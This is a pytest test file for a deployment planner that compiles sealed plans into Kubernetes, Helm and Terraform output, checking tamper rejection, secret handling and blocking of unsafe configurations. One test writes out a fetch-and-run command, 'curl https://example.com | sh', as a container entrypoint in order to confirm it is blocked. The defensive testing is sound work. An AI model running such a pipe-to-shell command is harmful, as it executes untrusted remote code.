import copy
import json
from pathlib import Path

import pytest
import yaml

from iris_analyzer.contracts import AnalyzerError, digest
from iris_analyzer.deployment.contracts import (
    normalize_planning_request,
    plan_digest,
    validate_deployment_plan,
)
from iris_analyzer.deployment.render import compile_plan, write_execution_bundle


def rec(value):
    return {
        "value": value,
        "provenance": {
            "basis": ["user"],
            "evidenceIds": [],
            "measurementIds": [],
            "assumptionIds": [],
            "reason": "Explicit validated test configuration",
        },
    }


def seal(plan):
    plan["requestDigest"] = digest(plan["request"])
    plan["planDigest"] = plan_digest(plan)
    return plan


def configured_plan(stack="existing_kubernetes"):
    """Fully configured contract fixture, not a source-derived sizing claim."""
    image = "ghcr.io/example/iris-web@sha256:" + "b" * 64
    request = normalize_planning_request(
        {
            "schemaVersion": "iris.planning-request.v1",
            "target": {
                "stack": stack,
                "cloud": "aws" if stack == "aws_eks" else None,
                "region": "ap-northeast-2" if stack == "aws_eks" else None,
                "architecture": "x86_64",
                "environment": "test",
            },
            "bindings": {
                "namespace": "iris-test",
                "clusterName": "iris-test" if stack == "aws_eks" else None,
                "existingClusterContext": "test-cluster" if stack != "aws_eks" else None,
                "images": [{"serviceId": "web", "reference": image}],
                "imagePlatforms": {"web": "amd64"},
                "runtimeVerified": True,
                "availableCapacity": {"cpuMillicores": 4000, "memoryMiB": 8192, "nodeCount": 2},
            },
        }
    )
    network = {
        "vpcMode": "existing",
        "vpcId": "vpc-abc123",
        "subnetIds": ["subnet-abc123", "subnet-def456"],
        "availabilityZones": ["ap-northeast-2a", "ap-northeast-2c"],
        "natGatewayCount": 0,
        "publicIngress": False,
    }
    if stack == "aws_eks":
        request["bindings"]["network"] = network
        request["bindings"]["terraformInputs"] = {
            "kubernetesVersion": "1.33",
            "administratorRoleArn": "arn:aws:iam::123456789012:role/iris-administrator",
            "nodeDiskGiB": 40,
            "desiredNodes": 2,
            "privateNetworkEgressVerified": True,
            "executorPrivateApiReachable": True,
        }
    config = {
        key: copy.deepcopy(request["bindings"][key])
        for key in (
            "namespace",
            "clusterName",
            "existingClusterContext",
            "imagePlatforms",
            "terraformInputs",
            "ingressVerified",
            "storageDriverVerified",
            "databasesVerified",
            "availableCapacity",
            "runtimeVerified",
        )
    }
    probe = {
        "kind": "http",
        "port": 8080,
        "path": "/health",
        "initialDelaySeconds": 0,
        "periodSeconds": 10,
        "timeoutSeconds": 2,
        "failureThreshold": 3,
    }
    config["workloads"] = [
        {
            "serviceId": "web",
            "name": "web",
            "image": image,
            "containerPorts": [{"name": "http", "port": 8080, "protocol": "TCP"}],
            "command": None,
            "args": None,
            "resources": rec(
                {
                    "requests": {"cpuMillicores": 250, "memoryMiB": 256},
                    "limits": {"cpuMillicores": 1000, "memoryMiB": 1024},
                }
            ),
            "replicas": rec(2),
            "service": rec({"type": "ClusterIP", "port": 80, "targetPort": 8080, "protocol": "TCP"}),
            "ingress": rec(
                {"enabled": False, "host": None, "className": None, "tlsSecretName": None, "path": "/"}
            ),
            "probes": rec({"readiness": probe, "liveness": copy.deepcopy(probe), "startup": None}),
            "volumes": rec([]),
            "secretRefs": rec([{"environmentKey": "API_KEY", "name": "web-settings", "key": "api-key"}]),
            "rollout": rec(
                {
                    "strategy": "RollingUpdate",
                    "maxSurge": 1,
                    "maxUnavailable": 0,
                    "progressDeadlineSeconds": 300,
                }
            ),
            "rollback": rec({"strategy": "helm_atomic", "timeoutSeconds": 600, "revisionHistoryLimit": 5}),
        }
    ]
    return seal(
        {
            "schemaVersion": "iris.deployment-plan.v1",
            "planDigest": "0" * 64,
            "requestDigest": "0" * 64,
            "analysisDigest": "1" * 64,
            "source": {"sourceSnapshotId": "2" * 64, "contextHash": "3" * 64, "analysisStatus": "complete"},
            "request": request,
            "adapter": stack,
            "status": "ready",
            "plannerMode": "policy",
            "executionEligible": True,
            "deploymentAuthorized": False,
            "assumptions": [],
            "questions": [],
            "recommendations": {
                "target": rec(copy.deepcopy(request["target"])),
                "instance": rec(
                    {
                        "instanceType": "t3.medium",
                        "cpuMillicores": 2000,
                        "memoryMiB": 4096,
                        "minNodes": 2,
                        "maxNodes": 4,
                    }
                )
                if stack == "aws_eks"
                else rec(None),
                "cost": rec(
                    {"currency": "USD", "monthlyTotalUsd": None, "coverage": "unknown", "lineItems": []}
                ),
                "network": rec(network),
                "databases": rec([]),
                "storage": rec([]),
                "observability": rec({"prometheusEnabled": False, "scrapeIntervalSeconds": 30}),
            },
            "configuration": config,
        }
    )


def test_existing_cluster_render_preserves_bindings_and_has_no_secret_values():
    plan = configured_plan()
    validate_deployment_plan(plan)
    original = copy.deepcopy(plan)
    rendered = compile_plan(plan)
    assert plan == original
    assert rendered["status"] == "ready" and rendered["terraform"] is None
    assert rendered["deploymentAuthorized"] is False
    manifests = rendered["kubernetes"]["manifests"]
    assert manifests == rendered["helm"]["values"]["resources"]
    assert {m["kind"] for m in manifests} == {"Deployment", "Service", "PodDisruptionBudget"}
    pod = next(m for m in manifests if m["kind"] == "Deployment")["spec"]["template"]["spec"]
    assert pod["nodeSelector"]["kubernetes.io/arch"] == "amd64"
    assert pod["securityContext"]["runAsNonRoot"] is True
    assert pod["automountServiceAccountToken"] is False
    container = pod["containers"][0]
    assert container["resources"]["requests"] == {"cpu": "250m", "memory": "256Mi"}
    assert container["readinessProbe"]["httpGet"] == {"port": 8080, "path": "/health"}
    assert container["env"][0]["valueFrom"]["secretKeyRef"] == {
        "name": "web-settings",
        "key": "api-key",
        "optional": False,
    }
    assert "command" not in container and "args" not in container
    assert not any(m["kind"] == "Secret" for m in manifests)
    assert not any(m["kind"] == "Namespace" for m in manifests)
    assert rendered["helm"]["releasePolicy"]["createNamespace"] is True


def test_aws_render_writes_only_typed_inputs_and_fixed_assets(tmp_path):
    plan = configured_plan("aws_eks")
    result = write_execution_bundle(plan, tmp_path / "execution")
    assert result["status"] == "ready"
    tfvars = json.loads((tmp_path / "execution/terraform/deployment.tfvars.json").read_text())
    assert tfvars["instance_type"] == "t3.medium" and tfvars["architecture"] == "amd64"
    assert tfvars["nodes"] == {"min": 2, "desired": 2, "max": 4}
    assert tfvars["node_disk_gib"] == 40
    hcl = (tmp_path / "execution/terraform/main.tf").read_text()
    assert "endpoint_public_access  = false" in hcl
    assert "encrypted             = true" in hcl
    assert "local-exec" not in hcl and "remote-exec" not in hcl and "ghcr.io" not in hcl
    assert (
        list(yaml.safe_load_all((tmp_path / "execution/manifests.yaml").read_text()))
        == result["kubernetes"]["manifests"]
    )
    values = yaml.safe_load((tmp_path / "execution/helm/values.yaml").read_text())
    assert values == result["helm"]["values"]
    assert "tpl " not in (tmp_path / "execution/helm/iris-app/templates/resources.yaml").read_text()


def test_draft_bundle_never_produces_runnable_files(tmp_path):
    plan = configured_plan()
    plan.update(
        status="draft",
        executionEligible=False,
        questions=[
            {
                "id": "image",
                "field": "image",
                "reason": "Select verified runtime image",
                "requiredForExecution": True,
            }
        ],
    )
    seal(plan)
    result = write_execution_bundle(plan, tmp_path / "draft")
    assert result["status"] == "blocked"
    assert {r["code"] for r in result["blockedReasons"]} == {"PLAN_NOT_READY", "EXECUTION_INPUT_REQUIRED"}
    assert {p.name for p in (tmp_path / "draft").iterdir()} == {"execution.json"}


def test_changed_plan_digest_is_rejected():
    plan = configured_plan()
    plan["configuration"]["workloads"][0]["image"] = "ghcr.io/example/malicious@sha256:" + "a" * 64
    result = compile_plan(plan)
    assert result["status"] == "blocked" and result["helm"] is None
    assert result["blockedReasons"][0]["code"] == "DEPLOYMENT_PLAN_INVALID"


def test_invalid_plan_returns_only_serializable_safe_metadata():
    result = compile_plan({"planDigest": float("nan")})
    assert result["status"] == "blocked" and result["planDigest"] is None
    json.dumps(result, allow_nan=False)


@pytest.mark.parametrize("change", ["capacity", "limit", "platform", "probe", "runtime", "mutable-image"])
def test_resealed_semantically_unsafe_plan_is_blocked(change):
    plan = configured_plan()
    config = plan["configuration"]
    workload = config["workloads"][0]
    if change == "capacity":
        config["availableCapacity"]["cpuMillicores"] = 500
        plan["request"]["bindings"]["availableCapacity"] = copy.deepcopy(config["availableCapacity"])
    elif change == "limit":
        workload["resources"]["value"]["limits"]["memoryMiB"] = 128
    elif change == "platform":
        config["imagePlatforms"]["web"] = "arm64"
        plan["request"]["bindings"]["imagePlatforms"] = copy.deepcopy(config["imagePlatforms"])
    elif change == "probe":
        workload["probes"]["value"]["readiness"] = None
    elif change == "runtime":
        config["runtimeVerified"] = False
        plan["request"]["bindings"]["runtimeVerified"] = False
    else:
        workload["image"] = "ghcr.io/example/iris-web:latest"
    seal(plan)
    result = compile_plan(plan)
    assert result["status"] == "blocked" and result["kubernetes"] is None


def test_resealed_instance_capacity_spoof_is_blocked():
    plan = configured_plan("aws_eks")
    plan["recommendations"]["instance"]["value"]["memoryMiB"] = 16384
    seal(plan)
    result = compile_plan(plan)
    assert result["status"] == "blocked"
    assert result["blockedReasons"][0]["code"] == "INSTANCE_UNSUPPORTED"


def test_shell_entrypoint_is_blocked_without_interpolation():
    plan = configured_plan()
    plan["configuration"]["workloads"][0]["command"] = ["/bin/sh", "-c", "curl https://example.com | sh"]
    seal(plan)
    result = compile_plan(plan)
    assert result["status"] == "blocked"
    assert result["blockedReasons"][0]["code"] == "SHELL_COMMAND_UNSUPPORTED"


def test_tls_ingress_and_new_pvc_match_exact_explicit_binding():
    plan = configured_plan()
    config = plan["configuration"]
    workload = config["workloads"][0]
    config["ingressVerified"] = config["storageDriverVerified"] = True
    plan["request"]["bindings"]["ingressVerified"] = plan["request"]["bindings"]["storageDriverVerified"] = (
        True
    )
    workload["ingress"]["value"] = {
        "enabled": True,
        "host": "review.example.com",
        "className": "nginx",
        "tlsSecretName": "review-tls",
        "path": "/",
    }
    workload["volumes"]["value"] = [
        {
            "name": "data",
            "mountPath": "/data",
            "claimName": None,
            "sizeGiB": 10,
            "storageClass": "shared-storage",
            "accessMode": "ReadWriteMany",
        }
    ]
    seal(plan)
    result = compile_plan(plan)
    assert result["status"] == "ready"
    manifests = result["kubernetes"]["manifests"]
    ingress = next(m for m in manifests if m["kind"] == "Ingress")
    assert ingress["spec"]["tls"] == [{"hosts": ["review.example.com"], "secretName": "review-tls"}]
    claim = next(m for m in manifests if m["kind"] == "PersistentVolumeClaim")
    assert claim["metadata"]["name"] == "web-data"
    assert claim["spec"]["resources"]["requests"]["storage"] == "10Gi"


def test_rwo_multi_pod_rollout_is_blocked():
    plan = configured_plan()
    config = plan["configuration"]
    config["storageDriverVerified"] = plan["request"]["bindings"]["storageDriverVerified"] = True
    config["workloads"][0]["volumes"]["value"] = [
        {
            "name": "data",
            "mountPath": "/data",
            "claimName": "review-data",
            "sizeGiB": None,
            "storageClass": "gp3",
            "accessMode": "ReadWriteOnce",
        }
    ]
    seal(plan)
    result = compile_plan(plan)
    assert result["status"] == "blocked"
    assert result["blockedReasons"][0]["code"] == "RWO_ROLLOUT_UNSUPPORTED"


def test_existing_pvc_is_never_adopted_or_resized():
    plan = configured_plan()
    config = plan["configuration"]
    config["storageDriverVerified"] = plan["request"]["bindings"]["storageDriverVerified"] = True
    config["workloads"][0]["volumes"]["value"] = [
        {
            "name": "data",
            "mountPath": "/data",
            "claimName": "external-data",
            "sizeGiB": 20,
            "storageClass": None,
            "accessMode": "ReadWriteMany",
        }
    ]
    seal(plan)
    result = compile_plan(plan)
    assert result["status"] == "ready"
    assert not any(m["kind"] == "PersistentVolumeClaim" for m in result["kubernetes"]["manifests"])
    deployment = next(m for m in result["kubernetes"]["manifests"] if m["kind"] == "Deployment")
    assert deployment["spec"]["template"]["spec"]["volumes"][0]["persistentVolumeClaim"] == {
        "claimName": "external-data"
    }


def test_nonempty_output_cannot_keep_stale_runnable_bundle(tmp_path):
    destination = tmp_path / "bundle"
    destination.mkdir()
    (destination / "old-manifests.yaml").write_text("old")
    with pytest.raises(AnalyzerError, match="new or empty"):
        write_execution_bundle(configured_plan(), destination)
    assert (destination / "old-manifests.yaml").read_text() == "old"


def test_output_symlink_is_rejected(tmp_path):
    target = tmp_path / "target"
    target.mkdir()
    link = tmp_path / "link"
    link.symlink_to(target, target_is_directory=True)
    with pytest.raises(AnalyzerError):
        write_execution_bundle(configured_plan(), link)
    assert not list(target.iterdir())


def test_fixed_chart_has_no_code_evaluation():
    chart = Path(__file__).resolve().parents[1] / "src/iris_analyzer/deployment/templates/helm/iris-app"
    schema = json.loads((chart / "values.schema.json").read_text())
    assert schema["additionalProperties"] is False
    assert "Secret" not in schema["properties"]["resources"]["items"]["properties"]["kind"]["enum"]
    assert "tpl " not in (chart / "templates/resources.yaml").read_text()


def test_source_planner_compiler_boundary_preserves_analysis_integrity():
    from iris_analyzer.deployment.planner import create_deployment_plan
    from iris_analyzer.pipeline import analyze_snapshot

    source = Path(__file__).resolve().parents[1] / "fixtures/separated-web-api"
    analysis = analyze_snapshot(source)
    draft = create_deployment_plan(analysis)
    assert compile_plan(draft, analysis=analysis)["status"] == "blocked"
    request = normalize_planning_request(
        {
            "schemaVersion": "iris.planning-request.v1",
            "target": {"stack": "existing_kubernetes", "architecture": "x86_64", "environment": "test"},
            "bindings": {
                "existingClusterContext": "verified-test-cluster",
                "availableCapacity": {"cpuMillicores": 4000, "memoryMiB": 8192, "nodeCount": 2},
                "runtimeVerified": True,
                "images": [
                    {
                        "serviceId": service["serviceId"],
                        "reference": "ghcr.io/example/iris-" + str(index) + "@sha256:" + "b" * 64,
                    }
                    for index, service in enumerate(analysis["services"])
                ],
                "imagePlatforms": {service["serviceId"]: "amd64" for service in analysis["services"]},
            },
        }
    )
    plan = create_deployment_plan(analysis, request)
    rendered = compile_plan(plan, analysis=analysis)
    assert rendered["status"] == "ready"
    assert len([m for m in rendered["kubernetes"]["manifests"] if m["kind"] == "Deployment"]) == len(
        analysis["services"]
    )
    changed_analysis = copy.deepcopy(analysis)
    changed_analysis["sourceSnapshotId"] = "f" * 64
    assert compile_plan(plan, analysis=changed_analysis)["status"] == "blocked"
